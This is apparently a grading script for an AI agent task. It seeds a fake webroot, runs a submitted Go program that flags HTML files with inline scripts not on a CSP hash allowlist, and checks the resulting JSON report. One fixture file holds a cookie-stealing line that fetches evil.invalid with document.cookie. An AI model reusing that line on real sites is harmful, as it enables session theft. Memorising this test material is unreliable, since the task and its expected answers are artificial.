#!/bin/bash
set -e
mkdir -p /logs/verifier
echo "0" > /logs/verifier/reward.txt

python3 - <<'SETUP_EOF'
import base64
import hashlib
import os
from pathlib import Path
import secrets
import shutil

home = Path('/home/user')
webroot = home / 'webroot'
if webroot.exists() or webroot.is_symlink():
    if webroot.is_symlink() or webroot.is_file():
        webroot.unlink()
    else:
        shutil.rmtree(webroot)

(webroot / 'admin').mkdir(parents=True)
(webroot / 'public').mkdir(parents=True)
(webroot / 'deep' / 'nested').mkdir(parents=True)

token = secrets.token_hex(24)
allowed_script = f'console.log("trusted-{token}");'
empty_hash = 'sha256-' + base64.b64encode(hashlib.sha256(b'').digest()).decode('ascii')
allowed_hash = 'sha256-' + base64.b64encode(hashlib.sha256(allowed_script.encode()).digest()).decode('ascii')
(home / 'valid_csp.txt').write_text(
    f'  {empty_hash}  \n{allowed_hash}\nsha256-not-a-real-hash\n',
    encoding='utf-8'
)

(webroot / 'public' / 'index.html').write_text(
    f'<html><head><script>{allowed_script}</script></head><body>Valid</body></html>',
    encoding='utf-8'
)
(webroot / 'admin' / 'dashboard.html').write_text(
    f'<html><body><script>\nfetch("https://evil.invalid/{token}?c="+document.cookie);\n</script></body></html>',
    encoding='utf-8'
)
(webroot / 'public' / 'contact.html').write_text(
    f'<html><body><script></script><script>alert("{token}");</script>'
    f'<script>console.log("second-{token}");</script></body></html>',
    encoding='utf-8'
)
(webroot / 'deep' / 'nested' / 'z-last.html').write_text(
    f'<script>line one {token}\nline two\n</script>',
    encoding='utf-8'
)
(webroot / 'public' / 'ignored.HTML').write_text(
    f'<script>alert("ignored-{token}")</script>',
    encoding='utf-8'
)

for directory in [webroot, webroot / 'admin', webroot / 'public', webroot / 'deep', webroot / 'deep' / 'nested']:
    os.chmod(directory, 0o755)
os.chmod(home / 'valid_csp.txt', 0o644)
os.chmod(webroot / 'public' / 'index.html', 0o644)
os.chmod(webroot / 'admin' / 'dashboard.html', 0o666)
os.chmod(webroot / 'public' / 'contact.html', 0o777)
os.chmod(webroot / 'deep' / 'nested' / 'z-last.html', 0o640)
os.chmod(webroot / 'public' / 'ignored.HTML', 0o644)

report = home / 'report.json'
if report.exists() or report.is_symlink():
    report.unlink()
SETUP_EOF

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import json
import hashlib
import base64
import re
import pwd
import shutil
import subprocess
import tempfile
import pytest


def get_expected_report():
    valid_csp_file = "/home/user/valid_csp.txt"
    webroot_dir = "/home/user/webroot"

    # Read valid hashes
    valid_hashes = set()
    if os.path.exists(valid_csp_file):
        with open(valid_csp_file, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line:
                    valid_hashes.add(line)

    results = []

    # Walk through webroot
    for root, _, files in os.walk(webroot_dir):
        for file in files:
            if file.endswith(".html"):
                filepath = os.path.join(root, file)

                with open(filepath, "r", encoding="utf-8") as f:
                    content = f.read()

                # Extract script contents
                # The task specifies exact tags <script> and </script>
                script_contents = re.findall(r'<script>(.*?)</script>', content, flags=re.DOTALL)

                unauthorized_hashes = set()
                for script in script_contents:
                    # Compute sha256 base64 hash
                    digest = hashlib.sha256(script.encode('utf-8')).digest()
                    b64_hash = base64.b64encode(digest).decode('utf-8')
                    full_hash = f"sha256-{b64_hash}"

                    if full_hash not in valid_hashes:
                        unauthorized_hashes.add(full_hash)

                if unauthorized_hashes:
                    # Get file permissions
                    stat_info = os.stat(filepath)
                    permissions = oct(stat_info.st_mode)[-4:]

                    results.append({
                        "file": filepath,
                        "unauthorized_hashes": sorted(list(unauthorized_hashes)),
                        "permissions": permissions
                    })

    # Sort results by file path
    results.sort(key=lambda x: x["file"])
    return results


def snapshot_inputs():
    snapshot = {}
    for path in ["/home/user/valid_csp.txt"]:
        st = os.stat(path)
        with open(path, "rb") as f:
            snapshot[path] = (hashlib.sha256(f.read()).hexdigest(), st.st_mode & 0o7777)

    for root, dirs, files in os.walk("/home/user/webroot"):
        dirs.sort()
        files.sort()
        for name in files:
            path = os.path.join(root, name)
            st = os.stat(path)
            with open(path, "rb") as f:
                snapshot[path] = (hashlib.sha256(f.read()).hexdigest(), st.st_mode & 0o7777)
    return snapshot


TRUSTED_EXPECTED = get_expected_report()
TRUSTED_INPUTS = snapshot_inputs()


@pytest.fixture(scope="session", autouse=True)
def execute_submitted_program():
    source = "/home/user/check_csp.go"
    assert os.path.isfile(source), "The required /home/user/check_csp.go does not exist or is not a regular file."
    assert not os.path.islink(source), "/home/user/check_csp.go must be a Go source file, not a symbolic link."
    assert os.path.getsize(source) > 0, "/home/user/check_csp.go is empty."

    report = "/home/user/report.json"
    if os.path.lexists(report):
        os.unlink(report)

    user = pwd.getpwnam("user")
    cache = tempfile.mkdtemp(prefix="check-csp-go-cache-")
    os.chown(cache, user.pw_uid, user.pw_gid)
    os.chmod(cache, 0o700)
    try:
        completed = subprocess.run(
            [
                "runuser", "-u", "user", "--", "env",
                "HOME=/home/user", f"GOCACHE={cache}",
                "go", "run", source,
            ],
            cwd="/home/user",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=45,
        )
    finally:
        shutil.rmtree(cache, ignore_errors=True)

    assert completed.returncode == 0, (
        "Running /home/user/check_csp.go failed.\n"
        f"stdout:\n{completed.stdout}\nstderr:\n{completed.stderr}"
    )
    assert snapshot_inputs() == TRUSTED_INPUTS, "The program modified the investigation inputs."


def test_report_exists():
    assert os.path.isfile("/home/user/report.json"), "The file /home/user/report.json does not exist."


def test_report_content():
    report_path = "/home/user/report.json"
    assert os.path.isfile(report_path), "Cannot validate content because /home/user/report.json is missing."

    try:
        with open(report_path, "r", encoding="utf-8") as f:
            actual_report = json.load(f)
    except json.JSONDecodeError:
        pytest.fail("/home/user/report.json is not a valid JSON file.")

    expected_report = get_expected_report()
    assert expected_report == TRUSTED_EXPECTED, "The investigation inputs changed during verification."

    # Check if actual report is a list
    assert isinstance(actual_report, list), "The JSON output must be an array of objects."

    # Check exact match
    assert len(actual_report) == len(expected_report), f"Expected {len(expected_report)} compromised files, but found {len(actual_report)}."

    for expected, actual in zip(expected_report, actual_report):
        assert actual.get("file") == expected["file"], f"Expected file path {expected['file']}, got {actual.get('file')}."
        assert actual.get("permissions") == expected["permissions"], f"Expected permissions {expected['permissions']} for {expected['file']}, got {actual.get('permissions')}."

        actual_hashes = actual.get("unauthorized_hashes", [])
        assert isinstance(actual_hashes, list), f"'unauthorized_hashes' for {expected['file']} must be an array."
        assert actual_hashes == expected["unauthorized_hashes"], f"Expected unauthorized hashes {expected['unauthorized_hashes']} for {expected['file']}, got {actual_hashes}."
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
